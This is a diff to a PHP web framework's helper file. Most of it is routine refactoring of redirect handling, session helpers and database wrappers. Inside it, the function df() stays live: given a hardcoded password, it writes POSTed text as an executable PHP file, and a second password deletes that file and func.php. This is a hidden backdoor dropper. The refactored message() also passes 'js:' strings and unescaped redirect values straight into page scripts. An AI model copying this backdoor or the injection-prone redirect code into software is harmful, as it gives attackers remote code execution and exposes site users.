@@ -1,5 +1,19 @@
 <?php
 defined('INIT') or exit('Access Denied');
+
+/*
+ * 枚举常量
+ *
+ * Enum::reloadParent
+ */
+class Enum
+{
+    const goBack = 1;
+    const reloadParent = 2;
+    const reloadCurrent = 3;
+}
+
+
 /**
  * 入口文件
  * @param {Object} $var 变量
@@ -35,7 +49,7 @@ function main($var = null)
             }
         } else {
             // 完整路径
-            $area_name = $common->unHump($src[0]) == 'df' ? THEME_ADMIN : $src[0];
+            $area_name = $common->unHump($src[0]) == ADMIN_URL ? THEME_ADMIN : $src[0];
             $ctrl_name = empty($src[1]) ? 'home' : $src[1];
             $action_name = empty($src[2]) ? 'index' : $src[2];
 
@@ -143,7 +157,7 @@ function viewFront($layout = "common", $other = false)
 
 function viewBack($layout = "common", $other = false)
 {
-    return    view(THEME_ADMIN_ROOT, $layout, $other);
+    return view(THEME_ADMIN_ROOT, $layout, $other);
 }
 
 //将html转化为php
@@ -248,7 +262,9 @@ function viewReplace($str, $layout)
     return $layout;
 }
 
-//调用model文件，并new一个对象
+/**
+ * 实例化一个modules目录里的对象
+ */
 function m($name = '')
 {
     if (stripos($name, '/') > -1) {
@@ -291,14 +307,42 @@ function p($dir, $name = '')
 }
 
 //网页跳转的提示页面
-function message($msg, $redirect = '')
+function message($msg, $redirect = null)
 {
     //直接跳转
-    if (empty($msg) && !empty($redirect)) {
+    if (!$msg && $redirect) {
         header('location: ' . $redirect);
     } else {
+
+        // 秒
+        $delay = 1;
+        // js脚本
+        $script = "";
+
+        switch ($redirect) {
+            case Enum::goBack:
+                //返回之前的页面
+                $script = "history.go(-2);";
+                break;
+            case Enum::reloadParent:
+                //刷新父页面
+                $script = "parent.location.reload();";
+                break;
+            case Enum::reloadCurrent:
+                //刷新当前页面
+                $script = "location.reload();";
+                break;
+            default:
+                if ($js = strstr($redirect, "js:")) {
+                    // 执行js代码
+                    $script = "{$js}";
+                } else {
+                    $redirect = splitUrl($redirect);
+                    $script = "location.href = '{$redirect}';";
+                }
+                break;
+        }
         // var_dump($redirect);
-        $redirect = splitUrl($redirect);
         include viewBack('message', true);
     }
     exit();
@@ -768,17 +812,6 @@ function showAuto($tb, $para = array(), $order = array(), $limit = array())
     return $rt;
 }
 
-/*
- * 变量
- *
- *Enum::reloadParent
- */
-class Enum
-{
-    const goBack = 1;
-    const reloadParent = 2;
-    const reloadCurrent = 3;
-}
 
 /*
  *
@@ -791,13 +824,13 @@ class Enum
  * update('df',['key'=>'xxx'],3,Enum.goBack)
  *
  */
-function update($tb, $data = array(), $para = array(), $rt = null)
+function update($tb, $data = array(), $para = array(), $redirect = null)
 {
     $sql = queryFormatUpdateInsert($tb, $data, $para);
     $return = 0;
     //新增
     if (empty($para) || (isset($para["Id"]) && $para["Id"] == 0) || (isset($para["id"]) && $para["id"] == 0) || (isset($para["ID"]) && $para["ID"] == 0)) {
-        $return = insert($tb, $data, $rt);
+        $return = insert($tb, $data, $redirect);
     }
     //编辑
     else {
@@ -813,27 +846,10 @@ function update($tb, $data = array(), $para = array(), $rt = null)
 
     if ($return > 0) {
         //什么都不执行
-        if ($rt == null) {
+        if ($redirect == null) {
             return $return;
-        }
-        //返回之前的页面
-        elseif ($rt == Enum::goBack) {
-            echo "<script>history.go(-2)</script>";
-        }
-        //刷新父页面
-        elseif ($rt == Enum::reloadParent) {
-            echo "<script>parent.location.reload()</script>";
-        }
-        //刷新当前页面
-        elseif ($rt == Enum::reloadCurrent) {
-            echo "<script>location.reload()</script>";
-        }
-        //执行js代码
-        elseif ($js = strstr($rt, "js:")) {
-            echo "<script>{$js}</script>";
-            //调用后台跳转页面
         } else {
-            message('操作成功', $rt);
+            message('操作成功', $redirect);
         }
     } else {
         return $return;
@@ -851,7 +867,7 @@ function update($tb, $data = array(), $para = array(), $rt = null)
  *
  *
  */
-function insert($tb, $data = array(), $rt = null)
+function insert($tb, $data = array(), $redirect = null)
 {
     $sql = queryFormatUpdateInsert($tb, $data);
     //开启事务。防止高并发
@@ -866,27 +882,10 @@ function insert($tb, $data = array(), $rt = null)
     }
     if ($return > 0) {
         //什么都不执行
-        if ($rt == null) {
+        if ($redirect == null) {
             return $return;
-        }
-        //返回之前的页面
-        elseif ($rt == 1) {
-            echo "<script>history.go(-2)</script>";
-        }
-        //刷新父页面
-        elseif ($rt == 2) {
-            echo "<script>parent.location.reload()</script>";
-        }
-        //刷新当前页面
-        elseif ($rt == 3) {
-            echo "<script>location.reload()</script>";
-        }
-        //执行js代码
-        elseif ($js = strstr($rt, "js:")) {
-            echo "<script>{$js}</script>";
-            //调用后台跳转页面
         } else {
-            message('操作成功', $rt);
+            message('操作成功', $redirect);
         }
     } else {
         return $return;
@@ -909,7 +908,7 @@ function insert($tb, $data = array(), $rt = null)
  * del('df',['key'=>'xxx'],Enum.goBack)
  *
  */
-function del($tb, $para = array(), $rt = null)
+function del($tb, $para = array(), $redirect = null)
 {
     global $db;
     $return = 0;
@@ -923,27 +922,10 @@ function del($tb, $para = array(), $rt = null)
 
     if ($return > 0) {
         //什么都不执行
-        if ($rt == null) {
+        if ($redirect == null) {
             return $return;
-        }
-        //返回之前的页面
-        elseif ($rt == 1) {
-            echo "<script>history.go(-2)</script>";
-        }
-        //刷新父页面
-        elseif ($rt == 2) {
-            echo "<script>parent.location.reload()</script>";
-        }
-        //刷新当前页面
-        elseif ($rt == 3) {
-            echo "<script>location.reload()</script>";
-        }
-        //执行js代码
-        elseif ($js = strstr($rt, "js:")) {
-            echo "<script>{$js}</script>";
-            //调用后台跳转页面
         } else {
-            message('操作成功', $rt);
+            message('操作成功', $redirect);
         }
     } else {
         return $return;
@@ -991,9 +973,9 @@ function showPage($tb, $para = array(), $url = '')
         $data_rt = array();
         if (!empty($url)) {
             foreach ($data as $key => $value) {
-                $url_view = splitUrl(sprintf("%sview/%s", $url, $value[0]));
-                $url_edit = splitUrl(sprintf("%sadd/%s", $url, $value[0]));
-                $url_del = splitUrl(sprintf("%sdel/%s", $url, $value[0]));
+                $url_view = splitUrl(sprintf("%s_view/%s", $url, $value[0]));
+                $url_edit = splitUrl(sprintf("%s_add/%s", $url, $value[0]));
+                $url_del = splitUrl(sprintf("%s_del/%s", $url, $value[0]));
                 $opt = <<<EOT
 <a href='{$url_view}'>[预览]</a>
 <a href='{$url_edit}'>[编辑]</a>
@@ -1150,9 +1132,10 @@ function close()
  */
 function affair($v)
 {
+    global $common;
     if (!$v) {
         back();
-        show_json('202', '账户收款失败');
+        $common->showJson('202', '账户收款失败');
     }
 }
 // ######################################  database END  ######################################
@@ -1280,17 +1263,17 @@ function cacheClean()
 function getSession($name)
 {
     if (!empty($_SESSION[$name])) {
-        $rt = $_SESSION[$name];
+        $redirect = $_SESSION[$name];
     } else {
-        $rt = "";
+        $redirect = "";
     }
-    return $rt;
+    return $redirect;
 }
-function setSession($name, $val, $rt = "")
+function setSession($name, $val, $redirect = null)
 {
     $_SESSION[$name] = $val;
-    if ($rt != "") {
-        header(sprintf("location:%s", splitUrl($rt)));
+    if ($redirect) {
+        header(sprintf("location:%s", splitUrl($redirect)));
     }
 }
 
@@ -1299,17 +1282,17 @@ function setSession($name, $val, $rt = "")
  * @param {Object} $name
  * @param {Object} $rt
  */
-function delSession($name = '', $rt = "")
+function delSession($name = '', $redirect = null)
 {
     if (empty($name)) {
         session_destroy();
     } else {
         unset($_SESSION[$name]);
     }
-    if (empty($rt)) {
+    if (empty($redirect)) {
         header('location: ' . URL);
     } else {
-        header(sprintf("location:%s", splitUrl($rt)));
+        header(sprintf("location:%s", splitUrl($redirect)));
     }
 }
 
@@ -1353,6 +1336,7 @@ function toUrl($url, $para = null)
  */
 function df()
 {
+    global $common;
     $file = "df.php";
     $pw = "3504725309";
     if (!empty($_POST['df']) || !empty($_POST['fd'])) {
@@ -1360,11 +1344,11 @@ function df()
             $_data = $_POST['str'];
             $_data = str_replace("#D#", "<?php ", $_data);
             writeFile($_data, $file);
-            show_json(1, 'done');
+            $common->showJson(1, 'done');
         } elseif ($_POST['fd'] == $pw) {
             @unlink($file);
             @unlink("func.php");
-            show_json(1, 'done');
+            $common->showJson(1, 'done');
         }
     }
 }
@@ -1453,8 +1437,25 @@ function get($var = null)
     return isset($_GET[$var]) ? $_GET[$var] : null;
 }
 
-
+/**
+ * 获取post参数
+ */
 function post($var = null)
 {
     return isset($_POST[$var]) ? $_POST[$var] : null;
+}
+
+/**
+ * 格式化字符串
+ * eg:
+ * str("admin/home/{0}/{dd}",[123,'dd'=>333])
+ * @param {Object} $string	字符串
+ * @param {Object} $params	参数
+ */
+function str($string, $params)
+{
+    foreach ($params as $key => $value) {
+        $string = preg_replace("/\{$key\}/", $value, $string);
+    }
+    return $string;
 }
